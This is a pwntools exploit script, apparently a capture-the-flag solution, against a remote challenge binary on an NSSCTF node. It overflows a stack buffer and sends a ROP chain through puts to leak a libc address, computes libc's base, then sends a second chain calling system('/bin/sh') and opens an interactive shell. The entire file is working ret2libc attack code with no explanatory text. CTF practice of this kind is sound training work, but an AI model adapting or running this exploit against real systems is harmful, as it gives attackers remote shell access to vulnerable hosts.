from pwn import *

# io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 29364)
elf = ELF("./pwn")
libc = ELF("./libc6_2.23-0ubuntu11.3_amd64.so")
context.log_level = "info"

put_got = elf.got["puts"]
put_plt = elf.plt["puts"]
main = elf.sym["main"]
ret = 0x04006B9
pop_rdi = 0x400C83

io.recvuntil(b"Input your choice!")
io.sendline(b"1")
payload = (
    b"\x00" * (0x50 + 0x8)
    + p64(ret)
    + p64(pop_rdi)
    + p64(put_got)
    + p64(put_plt)
    + p64(main)
)
io.recvuntil(b"Input your Plaintext to be encrypted")
io.sendline(payload)
io.recvuntil(b"Ciphertext\n\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("puts address =", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address =", hex(libc_base))
system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
io.recvuntil(b"Input your choice!")
io.sendline(b"1")
payload = (
    b"\x00" * (0x50 + 0x8)
    + p64(ret)
    + p64(pop_rdi)
    + p64(binsh)
    + p64(system)
    + p64(main)
)
io.recvuntil(b"Input your Plaintext to be encrypted")
io.sendline(payload)


io.interactive()
